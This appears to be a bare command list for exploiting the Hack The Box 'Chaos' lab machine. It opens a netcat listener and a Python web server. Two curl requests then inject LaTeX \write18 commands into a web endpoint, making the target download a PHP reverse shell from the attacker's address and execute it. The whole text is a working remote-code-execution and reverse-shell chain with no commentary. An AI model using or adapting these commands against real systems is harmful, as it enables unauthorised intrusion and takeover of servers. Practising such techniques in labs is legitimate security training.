gnome-terminal -e "nc -lnvp 1234"
gnome-terminal -e "python -m SimpleHTTPServer 8001"

curl -i -s -k -X 'POST' --data 'content=\write18{wget 10.10.13.211:8001/rev.php}&template=test1' http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php

curl -i -s -k -X 'POST' --data 'content=\write18{php rev.php}&template=test1' http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php

